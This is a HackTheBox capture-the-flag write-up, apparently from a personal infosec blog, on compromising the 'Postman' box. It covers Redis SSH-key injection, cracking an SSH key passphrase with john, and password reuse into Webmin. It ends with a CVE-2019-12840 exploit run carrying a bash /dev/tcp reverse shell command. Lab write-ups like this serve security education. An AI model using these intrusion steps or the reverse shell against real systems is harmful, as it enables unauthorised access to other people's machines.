<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>Postman - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Postman was an &amp;ldquo;easy&amp;rdquo; rated box. It was quite quick but nice to solve. It can be really interesting if you want to learn and play with the now widely used Redis.
Tl;Dr: The user flag consisted in exploiting a redis instance accessible without authentication. From this instance you would bruteforce the passphrase of a SSH key found in a backup folder and use its password to pivot from redis user to Matt user."/>
<meta name="keywords" content="hackthebox, ctf, postman, gobuster, webmin, redis, cve-2019-12840, ssh, john"/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="/posts/postman/" />




<link rel="stylesheet" href="/assets/style.css">


<link rel="stylesheet" href="/style.css">


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
<link rel="shortcut icon" href="/img/favicon.png">

<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">

<link rel="shortcut icon" href="/img/favicon.ico">



<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Postman - HackTheBox"/>
<meta name="twitter:description" content="Postman was an &#34;easy&#34; rated box. It was quite quick but nice to solve. It can be really interesting if you want to learn and play with the now widely used Redis.

**Tl;Dr:** The user flag consisted in exploiting a redis instance accessible without authentication. From this instance you would bruteforce the passphrase of a SSH key found in a backup folder and use its password to pivot from `redis` user to `Matt` user.  
Using the same password we could login to a Webmin panel and use an exploit (CVE-2019-12840) to achieve remote commands execution as root and grab the flag.

Alright, let&#39;s get into it!"/>



<meta property="og:title" content="Postman - HackTheBox" />
<meta property="og:description" content="Postman was an &#34;easy&#34; rated box. It was quite quick but nice to solve. It can be really interesting if you want to learn and play with the now widely used Redis.

**Tl;Dr:** The user flag consisted in exploiting a redis instance accessible without authentication. From this instance you would bruteforce the passphrase of a SSH key found in a backup folder and use its password to pivot from `redis` user to `Matt` user.  
Using the same password we could login to a Webmin panel and use an exploit (CVE-2019-12840) to achieve remote commands execution as root and grab the flag.

Alright, let&#39;s get into it!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/postman/" />
<meta property="article:published_time" content="2020-03-14T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-03-14T00:00:00+00:00" /><meta property="og:site_name" content="hg8&#39;s Notes" />






  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">./hg8.sh</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        
<nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/">Posts</a></li>
        
      
        
          <li><a href="/tags">Tags</a></li>
        
      
        
          <li><a href="/about">About</a></li>
        
      
      
    
    <li>
<a href="/search" title="Search">
<img src="/icon/search.svg" alt="search" height="20">
</a>
<li>
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/">Posts</a></li>
      
    
      
        <li><a href="/tags">Tags</a></li>
      
    
      
        <li><a href="/about">About</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h2 class="post-title"><a href="/posts/postman/">Postman - HackTheBox</a></h2>
    <div class="post-meta">
      
        <span class="post-date">
          2020-03-14
        </span>

        
          
        
      

      <span class="post-author">— Written by hg8</span>
      
        <span class="post-read-time">— 11 min read</span>
      
    </div>

    
      <span class="post-tags">
        
          #<a href="/tags/hackthebox/">hackthebox</a>&nbsp;
        
          #<a href="/tags/ctf/">ctf</a>&nbsp;
        
          #<a href="/tags/postman/">postman</a>&nbsp;
        
          #<a href="/tags/gobuster/">gobuster</a>&nbsp;
        
          #<a href="/tags/webmin/">webmin</a>&nbsp;
        
          #<a href="/tags/redis/">redis</a>&nbsp;
        
          #<a href="/tags/cve-2019-12840/">cve-2019-12840</a>&nbsp;
        
          #<a href="/tags/ssh/">ssh</a>&nbsp;
        
          #<a href="/tags/john/">john</a>&nbsp;
        
      </span>
    

    
      
        <img src="/img/postman-hackthebox.png" class="post-cover" />
      
    

    <div class="post-content">
      <p>Postman was an &ldquo;easy&rdquo; rated box. It was quite quick but nice to solve. It can be really interesting if you want to learn and play with the now widely used Redis.</p>
<p><strong>Tl;Dr:</strong> The user flag consisted in exploiting a redis instance accessible without authentication. From this instance you would bruteforce the passphrase of a SSH key found in a backup folder and use its password to pivot from <code>redis</code> user to <code>Matt</code> user.<br>
Using the same password we could login to a Webmin panel and use an exploit (CVE-2019-12840) to achieve remote commands execution as root and grab the flag.</p>
<p>Alright, let&rsquo;s get into it!</p>
<hr>
<p>First thing first, let&rsquo;s add the box IP to the host file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;10.10.10.160 postman.htb&#34;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>and let&rsquo;s start!</p>
<h2 id="user-flag">User flag</h2>
<h3 id="recon">Recon</h3>
<p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nmap -sV -sT -sC postman.htb
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-12-22 20:34 CET
Nmap scan report <span style="color:#66d9ef">for</span> postman.htb <span style="color:#f92672">(</span>10.10.10.160<span style="color:#f92672">)</span>
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
80/tcp    open  http     Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
|_http-title: The Cyber Geek<span style="color:#960050;background-color:#1e0010">&#39;</span>s Personal Website
10000/tcp open  ssl/http MiniServ 1.910 <span style="color:#f92672">(</span>Webmin httpd<span style="color:#f92672">)</span>
|_ssl-cert: Subject: commonName<span style="color:#f92672">=</span>*/organizationName<span style="color:#f92672">=</span>Webmin Webserver on Postman
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 46.41 seconds
</code></pre></div><p>We have the &ldquo;classic&rdquo;: A web app running on port 80 and the SSH port 22 open. We also have a Webmin server running on port 10000.</p>
<p>Opening <code>http://postman.htb</code> display the following website:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/71326943-07d84e00-2502-11ea-904d-67647430f4dc.png" alt="postman website"></p>
<p>While <code>https://postman.htb:10000/</code> display the classical Webmin login page:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/71326975-af558080-2502-11ea-9618-f52af748ddf7.png" alt="postman webmin"></p>
<p>Starting from there&hellip;.well&hellip; There isn&rsquo;t anything interesting. I run into a lot of rabbit holes without being able to find anything.</p>
<p>In particularly I tried running exploits against the Webmin instance including the infamous <a href="https://twitter.com/_hg8_/status/1162694712177954819">CVE-2019-15107 - Remote Code Execution via Password Reset function</a>. But I couldn&rsquo;t get anything to work nor making progress any progress.</p>
<p>A piece of the puzzle looked missing to me. When this happen I like to restart my recon process from the beginning, to make sure I didn&rsquo;t forgot anything.</p>
<p>Let&rsquo;s start by re-running <code>nmap</code>, but this time on the top 10,000 ports:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nmap -sV -sT -sC --top-ports <span style="color:#ae81ff">10000</span> postman.htb
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-12-22 20:39 CET
Nmap scan report <span style="color:#66d9ef">for</span> postman.htb <span style="color:#f92672">(</span>10.10.10.160<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.035s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">8316</span> closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
80/tcp    open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
|_http-title: The Cyber Geek<span style="color:#e6db74">&#39;s Personal Website
</span><span style="color:#e6db74">6379/tcp  open  redis   Redis key-value store 4.0.9
</span><span style="color:#e6db74">10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
</span><span style="color:#e6db74">|_http-title: Site doesn&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; Charset<span style="color:#f92672">=</span>iso-8859-1<span style="color:#f92672">)</span>.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 150.41 seconds
</code></pre></div><p>Aah that&rsquo;s interesting! A new service appeared. A redis instance running on port 6379. That&rsquo;s probably the missing piece of our puzzle.</p>
<p>Being new to redis I spent a bit of time reading articles and documentations on redis before starting anything.<br>
During my research I stumbled upon this very interesting article: <a href="http://antirez.com/news/96">&ldquo;A few things about Redis security&rdquo;</a>.</p>
<p>The article, written by one of the redis dev, explain how to &ldquo;<em>crack Redis for fun and no profit</em>&rdquo; on exposed redis instance with no authentication activated.</p>
<p>Maybe it&rsquo;s our case ? First, let&rsquo;s check if the redis instance need authentication:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ telnet postman.htb <span style="color:#ae81ff">6379</span>
Trying 10.10.10.160...
Connected to postman.htb.
Escape character is <span style="color:#e6db74">&#39;^]&#39;</span>.
echo <span style="color:#e6db74">&#34;Hey no AUTH required!&#34;</span>
$21
Hey no AUTH required!
quit
+OK
Connection closed by foreign host.
</code></pre></div><p>Well, indeed not auth is needed to access this redis instance, that&rsquo;s good news. Let&rsquo;s follow the article to see if we can exploit it the same way the author present in his article.</p>
<p>The next step described in the article is to write our own SSH Public key into <code>~/ssh/authorized_keys</code> in order to gain access to the server.</p>
<p>First step is to generate a ssh key pair that we will add to the <code>authorized_keys</code> of the server:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh-keygen -t rsa -C <span style="color:#e6db74">&#34;hg8@hg8.hg8&#34;</span>
Generating public/private rsa key pair.
Enter file in which to save the key <span style="color:#f92672">(</span>/home/hg8/.ssh/id_rsa<span style="color:#f92672">)</span>: ./id_rsa
Enter passphrase <span style="color:#f92672">(</span>empty <span style="color:#66d9ef">for</span> no passphrase<span style="color:#f92672">)</span>:
Enter same passphrase again:
Your identification has been saved in ./id_rsa.
Your public key has been saved in ./id_rsa.pub.
The key fingerprint is:
f0:a1:52:e9:0d:5f:e4:d9:35:33:73:43:b4:c8:b9:27 hg8@hg8.hg8
The key<span style="color:#960050;background-color:#1e0010">&#39;</span>s randomart image is:
+--<span style="color:#f92672">[</span> RSA 2048<span style="color:#f92672">]</span>----+
|          .   O+.|
|       . o o..o*o|
|      <span style="color:#f92672">=</span> . + .+ . |
|     o B o    .  |
|    . o S    E . |
|     .        o  |
|                 |
|                 |
|                 |
+-----------------+
</code></pre></div><p>I quote the author on this part since he explains way better than me:</p>
<blockquote>
<p>Now I’ve a key. My goal is to put it into the Redis server memory, and later to transfer it into a file, in a way that the resulting authorized_keys file is still a valid one. Using the RDB format to do this has the problem that the output will be binary and may in theory also compress strings. But well, maybe this is not a problem. To start let’s pad the public SSH key I generated with newlines before and after the content:</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ <span style="color:#f92672">(</span>echo -e <span style="color:#e6db74">&#34;\n\n&#34;</span>; cat id_rsa.pub; echo -e <span style="color:#e6db74">&#34;\n\n&#34;</span><span style="color:#f92672">)</span> &gt; id_rsa_with_nl.pub
</code></pre></div><p>Now that we have all the pieces, let&rsquo;s add our ssh key to the <code>authorized_keys</code> file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ redis-cli -h 10.10.10.160 echo flushall
<span style="color:#e6db74">&#34;flushall&#34;</span>
<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ cat id_rsa_with_nl.pub | redis-cli -h 10.10.10.160 -x set crackit
OK
<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ redis-cli -h 10.10.10.160 config set dir /var/lib/redis/.ssh
OK
<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ redis-cli -h 10.10.10.160 config set dbfilename <span style="color:#e6db74">&#34;authorized_keys&#34;</span>
OK
<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ redis-cli -h 10.10.10.160 save
OK
</code></pre></div><p>Then let&rsquo;s try to login using this generated ssh key:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh -i id_rsa redis@postman.htb
Welcome to Ubuntu 18.04.3 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-58-generic x86_64<span style="color:#f92672">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available <span style="color:#66d9ef">for</span> installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug <span style="color:#ae81ff">26</span> 03:04:25 <span style="color:#ae81ff">2019</span> from 10.10.10.1
redis@Postman:~$
</code></pre></div><h3 id="pivot-redis---matt">Pivot Redis -&gt; Matt</h3>
<p>Ok, now we have access to the machine with <code>redis</code> user, let&rsquo;s now find the user to pivot to :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">redis@Postman:~$ ls -l /home/Matt/
total <span style="color:#ae81ff">4</span>
-rw-rw---- <span style="color:#ae81ff">1</span> Matt Matt <span style="color:#ae81ff">33</span> Aug <span style="color:#ae81ff">26</span> 03:07 user.txt
</code></pre></div><p><code>Matt</code> is our user. Let&rsquo;s do a bit more of recon to see if we can find additional informations.</p>
<p>While searching around, we find an interesting backup file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">redis@Postman:/$ cat /opt/id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw<span style="color:#f92672">==</span>
-----END RSA PRIVATE KEY-----
</code></pre></div><p>A private RSA key, we can probably use it to connect to <code>matt</code> account using SSH&hellip; Let&rsquo;s pull this key to work on it offline:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ scp -i id_rsa redis@postman.htb:/opt/id_rsa.bak .
id_rsa.bak  100% <span style="color:#ae81ff">1743</span>    48.1KB/s   00:00
</code></pre></div><p>First thing to try login through SSH on <code>Matt</code>'s&rsquo; account with this key:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ chmod <span style="color:#ae81ff">600</span> id_rsa.bak
<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh -i id_rsa.bak Matt@postman.htb
Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;id_rsa.bak&#39;</span>:
</code></pre></div><p>Of course a passphare is needed. Maybe we can bruteforce it? Calling <code>john</code> to the rescue:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh2john id_rsa.bak &gt; id_rsa.hash

<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ john --wordlist<span style="color:#f92672">=</span>~/SecLists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash
Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>SSH <span style="color:#f92672">[</span>RSA/DSA/EC/OPENSSH <span style="color:#f92672">(</span>SSH private keys<span style="color:#f92672">)</span> 32/64<span style="color:#f92672">])</span>
Will run <span style="color:#ae81ff">2</span> OpenMP threads
Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
computer2008     <span style="color:#f92672">(</span>id_rsa.bak<span style="color:#f92672">)</span>
1g 0:00:00:12 DONE <span style="color:#f92672">(</span>2019-12-22 21:16<span style="color:#f92672">)</span> 0.08264g/s 1185Kp/s 1185Kc/s 1185KC/s *7¡Vamos!
Session completed
</code></pre></div><p>Good, we got a passphrase here! Let&rsquo;s try to login again:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh -i id_rsa.bak Matt@postman.htb
Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;id_rsa.bak&#39;</span>:
Connection closed by 10.10.10.160 port <span style="color:#ae81ff">22</span>
</code></pre></div><p>We immediately get a<code>Connection closed</code> error message upon connexion&hellip; Seems like we have the right ssh key, the right passphare but the ssh config forbid <code>Matt</code> to connect.</p>
<p>Let&rsquo;s confirm those doubts:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">redis@Postman:~$ cat /etc/ssh/sshd_config
<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
<span style="color:#75715e">#deny users</span>
DenyUsers Matt
</code></pre></div><p>Alright so <code>Matt</code> is not allowed to SSH, we need to find another way to access his account.</p>
<p>If <code>Matt</code> reuse password we should be able switch to <code>Matt</code> from <code>Redis</code> user using <code>su</code>&hellip;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">redis@Postman:~$ su - Matt
Password:
Matt@Postman:~$ cat user.txt
51xxxxxxxxxxxxxxxxxxxxxx3c
</code></pre></div><h2 id="root-flag">Root Flag</h2>
<h3 id="recon-1">Recon</h3>
<p>Now that we have access to our user, let&rsquo;s make a bit of recon to see if we can escalate our privileges to root.</p>
<p>After a while we can not find anything worthy onto <code>Matt</code> account. Once again, when being stuck let&rsquo;s go back at beginning to make sure we don&rsquo;t forget anything. Remember that Webmin instance ? It must be there for a reason&hellip;</p>
<p>Knowing that <code>Matt</code> reuse his password maybe we can be able to connect to Webmin using the same credentials (<code>Matt</code>:<code>computer2008</code>) ?</p>
<p>Let&rsquo;s try to login:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/71327015-402c5c00-2503-11ea-871c-0a5321984f47.png" alt="postman webmin login"></p>
<p>Success! <code>We are in...</code></p>
<p>From this control panel we can not access a lot&hellip; Only the <code>Software Package Updates</code> page. We can not seem to do anything interesting from there.</p>
<p>Knowing from the <code>nmap</code> result and the page footer, the Webmin version is <code>1.910</code>, let&rsquo;s see if some exploit have been published:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ searchsploit webmin
----------------------------------------------------------- ----------------------------------------
 Exploit Title                                             |  Path
                                                           | <span style="color:#f92672">(</span>/usr/share/exploitdb/<span style="color:#f92672">)</span>
----------------------------------------------------------- ----------------------------------------
DansGuardian Webmin Module 0.x - <span style="color:#e6db74">&#39;edit.cgi&#39;</span> Directory Trav | exploits/cgi/webapps/23535.txt
Webmin - Brute Force / Command Execution                   | exploits/multiple/remote/705.pl
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofin | exploits/linux/remote/22275.pl
Webmin 0.x - <span style="color:#e6db74">&#39;RPC&#39;</span> Privilege Escalation                    | exploits/linux/remote/21765.pl
Webmin 0.x - Code Input Validation                         | exploits/linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution               | exploits/multiple/remote/746.pl
Webmin 1.5 - Web Brute Force <span style="color:#f92672">(</span>CGI<span style="color:#f92672">)</span>                         | exploits/multiple/remote/745.pl
Webmin 1.580 - <span style="color:#e6db74">&#39;/file/show.cgi&#39;</span> Remote Command Execution <span style="color:#f92672">(</span> | exploits/unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                    | exploits/cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>       | exploits/cgi/remote/46201.rb
Webmin 1.910 - <span style="color:#e6db74">&#39;Package Updates&#39;</span> Remote Command Execution  | exploits/linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                       | exploits/linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution <span style="color:#f92672">(</span>Meta | exploits/linux/remote/47230.rb
Webmin 1.x - HTML Email Command Execution                  | exploits/cgi/webapps/24574.txt
Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosu | exploits/multiple/remote/1997.php
Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosu | exploits/multiple/remote/2017.pl
phpMyWebmin 1.0 - <span style="color:#e6db74">&#39;target&#39;</span> Remote File Inclusion           | exploits/php/webapps/2462.txt
phpMyWebmin 1.0 - <span style="color:#e6db74">&#39;window.php&#39;</span> Remote File Inclusion       | exploits/php/webapps/2451.txt
webmin 0.91 - Directory Traversal                          | exploits/cgi/remote/21183.txt
----------------------------------------------------------- ----------------------------------------
</code></pre></div><p>Well well, what do we have here&hellip; <code>Webmin 1.910 - 'Package Updates' Remote Command Execution</code>. Sounds exactly what we need! Let&rsquo;s try this one.</p>
<p>This exploit first came as a Metasploit module, but since I try to avoid using Metasploit as much as possible I will use this <a href="https://github.com/bkaraceylan/CVE-2019-12840_POC">Python version</a>.</p>
<p>First, let&rsquo;s open our netcat listener:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
Listening on any address <span style="color:#ae81ff">8585</span>
</code></pre></div><p>And let&rsquo;s launch the exploit (after reading the source code, no modification seems needed to make it work properly on this box):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ git clone https://github.com/bkaraceylan/CVE-2019-12840_POC.git
Cloning into <span style="color:#e6db74">&#39;CVE-2019-12840_POC&#39;</span>...
Unpacking objects: 100% <span style="color:#f92672">(</span>10/10<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ cd CVE-2019-12840_POC
<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python exploit.py -u https://postman.htb -p <span style="color:#ae81ff">10000</span> -U Matt -P computer2008 -c <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.10.10.10/8585 0&gt;&amp;1&#34;</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attempting to login...
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploiting...
